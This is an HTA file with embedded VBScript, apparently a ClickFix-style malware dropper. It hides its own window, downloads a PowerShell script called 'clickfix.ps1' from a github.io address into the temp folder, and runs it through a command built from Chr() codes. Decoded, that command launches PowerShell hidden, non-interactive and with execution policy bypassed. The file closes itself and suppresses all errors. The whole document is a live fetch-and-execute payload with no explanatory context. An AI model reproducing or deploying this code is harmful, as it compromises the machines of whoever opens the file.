<html>
<head><title>.</title>
<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
<script language="VBScript">
On Error Resume Next
Dim s,f,t,p,u,a
Set s = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
t = f.GetSpecialFolder(2)
p = t & "\c.ps1"
u = "https://kai195102.github.io/d/clickfix.ps1"
s.Run "curl -sLo """ & p & """ """ & u & """", 0, True
a = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)
a = a & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(110)&Chr(73)
a = a & Chr(32)&Chr(45)&Chr(87)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)
a = a & Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)
a = a & Chr(32)&Chr(45)&Chr(70)&Chr(32)&Chr(34) & p & Chr(34)
s.Run a, 0, False
window.close()
</script>
</head>
<body></body>
</html>
